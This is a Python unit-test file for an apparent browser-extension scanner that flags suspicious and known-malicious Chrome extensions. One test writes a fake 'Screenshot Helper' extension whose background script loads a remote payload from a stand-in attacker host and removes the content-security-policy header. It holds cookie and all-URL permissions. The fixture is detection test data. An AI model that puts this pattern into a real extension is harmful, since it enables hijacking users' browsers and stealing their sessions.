from __future__ import annotations

import json
import unittest
import uuid
from datetime import datetime, timezone
from pathlib import Path

from backend.models import ScanOptions
from backend.reports import build_html_report, write_csv_report, write_pdf_report
from backend.scanner import import_legacy_csv, scan_local_extensions
from backend.service import ScanRecord, ScanService


def write_json(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


def workspace_tempdir() -> Path:
    root = Path("tests") / ".tmp"
    root.mkdir(parents=True, exist_ok=True)
    path = root / uuid.uuid4().hex
    path.mkdir(parents=True, exist_ok=True)
    return path


class ScannerTests(unittest.TestCase):
    def test_localized_names_and_profile_detection(self) -> None:
        temp_dir = workspace_tempdir()
        root = temp_dir / "ChromeRoot"
        write_json(
            root / "Local State",
            {
                "profile": {
                    "info_cache": {
                        "Default": {"name": "Default Person"},
                        "Profile 1": {"name": "Research"},
                    }
                }
            },
        )
        for profile in ["Default", "Profile 1"]:
            write_json(
                root / profile / "Preferences",
                {
                    "extensions": {
                        "settings": {
                            "abcdefghijklmnopabcdefghijklmnop": {
                                "state": 1,
                                "location": 1,
                            }
                        }
                    }
                },
            )

        version_dir = root / "Default" / "Extensions" / "abcdefghijklmnopabcdefghijklmnop" / "1.2.3"
        version_dir.mkdir(parents=True)
        write_json(
            version_dir / "manifest.json",
            {
                "manifest_version": 3,
                "name": "__MSG_extName__",
                "description": "__MSG_extDescription__",
                "version": "1.2.3",
                "default_locale": "en",
                "permissions": ["tabs"],
                "content_scripts": [{"matches": ["https://*/*"]}],
            },
        )
        write_json(
            version_dir / "_locales" / "en" / "messages.json",
            {
                "extname": {"message": "Resolved Name"},
                "extdescription": {"message": "Resolved Description"},
            },
        )

        profile1_version = root / "Profile 1" / "Extensions" / "abcdefghijklmnopabcdefghijklmnop" / "1.2.3"
        profile1_version.mkdir(parents=True)
        write_json(
            profile1_version / "manifest.json",
            {
                "manifest_version": 3,
                "name": "Resolved Name",
                "description": "Resolved Description",
                "version": "1.2.3",
                "permissions": ["tabs"],
            },
        )

        findings = scan_local_extensions(ScanOptions(roots=[str(root)]))

        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].name, "Resolved Name")
        self.assertEqual(
            sorted(profile.profile_name for profile in findings[0].profiles),
            ["Default Person", "Research"],
        )

    def test_suspicious_detection_prefers_suspicious_over_powerful(self) -> None:
        temp_dir = workspace_tempdir()
        root = temp_dir / "ChromeRoot"
        write_json(root / "Local State", {"profile": {"info_cache": {"Default": {"name": "Default"}}}})
        write_json(
            root / "Default" / "Preferences",
            {
                "extensions": {
                    "settings": {
                        "badbadbadbadbadbadbadbadbadbadba": {"state": 1, "location": 1}
                    }
                }
            },
        )

        version_dir = root / "Default" / "Extensions" / "badbadbadbadbadbadbadbadbadbadba" / "9.9.9"
        version_dir.mkdir(parents=True)
        write_json(
            version_dir / "manifest.json",
            {
                "manifest_version": 3,
                "name": "Screenshot Helper",
                "description": "Take screenshots quickly",
                "version": "9.9.9",
                "permissions": ["cookies", "webRequest", "tabs"],
                "host_permissions": ["<all_urls>"],
            },
        )
        (version_dir / "background.js").write_text(
            """
            chrome.alarms.create("h", { periodInMinutes: 1 });
            fetch("https://evil.example/config");
            const s = document.createElement("script");
            s.src = "https://evil.example/payload.js";
            chrome.declarativeNetRequest.updateSessionRules({ addRules: [{ action: { responseHeaders: [{ header: "content-security-policy", operation: "set", value: "" }] } }] });
            eval("console.log('x')");
            """,
            encoding="utf-8",
        )

        findings = scan_local_extensions(ScanOptions(roots=[str(root)]))
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].verdict, "suspicious")
        self.assertGreaterEqual(findings[0].suspicion_score, 45)

    def test_known_bad_registry_promotes_verdict(self) -> None:
        temp_dir = workspace_tempdir()
        root = temp_dir / "ChromeRoot"
        extension_id = "mdaboflcmhejfihjcbmdiebgfchigjcf"
        write_json(root / "Local State", {"profile": {"info_cache": {"Default": {"name": "Default"}}}})
        write_json(
            root / "Default" / "Preferences",
            {"extensions": {"settings": {extension_id: {"state": 1, "location": 1}}}},
        )
        version_dir = root / "Default" / "Extensions" / extension_id / "1.0.0"
        version_dir.mkdir(parents=True)
        write_json(
            version_dir / "manifest.json",
            {
                "manifest_version": 3,
                "name": "Blipshot",
                "description": "Take screenshots",
                "version": "1.0.0",
                "permissions": ["activeTab"],
            },
        )

        findings = scan_local_extensions(ScanOptions(roots=[str(root)]))
        self.assertEqual(findings[0].verdict, "known_malicious")
        self.assertEqual(findings[0].store_status, "not_checked")
        self.assertGreaterEqual(len(findings[0].intel_matches), 1)

    def test_offline_scan_does_not_mark_removed(self) -> None:
        temp_dir = workspace_tempdir()
        root = temp_dir / "ChromeRoot"
        extension_id = "jjalcfnidlmpjhdfepjhjbhnhkbgleap"
        write_json(root / "Local State", {"profile": {"info_cache": {"Default": {"name": "Default"}}}})
        write_json(
            root / "Default" / "Preferences",
            {"extensions": {"settings": {extension_id: {"state": 1, "location": 1}}}},
        )
        version_dir = root / "Default" / "Extensions" / extension_id / "2.0.0"
        version_dir.mkdir(parents=True)
        write_json(
            version_dir / "manifest.json",
            {
                "manifest_version": 3,
                "name": "Shodan",
                "description": "Look up the current site's infrastructure.",
                "version": "2.0.0",
                "permissions": ["activeTab"],
            },
        )

        findings = scan_local_extensions(ScanOptions(roots=[str(root)], enable_live_checks=False))
        self.assertEqual(findings[0].store_status, "not_checked")
        self.assertNotEqual(findings[0].verdict, "removed_or_unavailable")

    def test_legacy_csv_import_and_report_exports(self) -> None:
        content = (
            "Name,Version,Risk Score,Risk Level,Permissions\n"
            "Shodan,2.0.0,30/100,LOW-MEDIUM RISK,2\n"
        ).encode("utf-8")
        findings = import_legacy_csv("legacy.csv", content)
        self.assertEqual(findings[0].name, "Shodan")

        report_dir = workspace_tempdir()
        scan = ScanRecord(
            scan_id="scan123",
            created_at=datetime.now(timezone.utc),
            status="completed",
            source="csv_import",
            options=ScanOptions(),
            findings=findings,
            report_dir=report_dir,
        )
        csv_path = write_csv_report(scan, report_dir / "scan123.csv")
        pdf_path = write_pdf_report(scan, report_dir / "scan123.pdf")
        html_report = build_html_report(scan)

        self.assertTrue(csv_path.exists())
        self.assertTrue(pdf_path.exists())
        self.assertIn("ManifestGuard v2", html_report)

    def test_service_loads_saved_scans_from_disk(self) -> None:
        report_dir = workspace_tempdir() / "persisted"
        report_dir.mkdir(parents=True, exist_ok=True)
        content = (
            "Name,Version,Risk Score,Risk Level,Permissions\n"
            "Wayback Machine,3.4.8,80/100,HIGH RISK,8\n"
        ).encode("utf-8")
        findings = import_legacy_csv("saved.csv", content)
        scan = ScanRecord(
            scan_id="persist123",
            created_at=datetime.now(timezone.utc),
            status="completed",
            source="csv_import",
            options=ScanOptions(enable_live_checks=True),
            findings=findings,
            report_dir=report_dir,
        )
        write_json(report_dir / "persist123.json", scan.to_detail_dict())

        service = ScanService(data_dir=report_dir.parent)
        loaded = service.get_scan("persist123")

        self.assertIsNotNone(loaded)
        assert loaded is not None
        self.assertEqual(loaded.scan_id, "persist123")
        self.assertEqual(loaded.findings[0].name, "Wayback Machine")
        self.assertTrue(loaded.options.enable_live_checks)


if __name__ == "__main__":
    unittest.main()
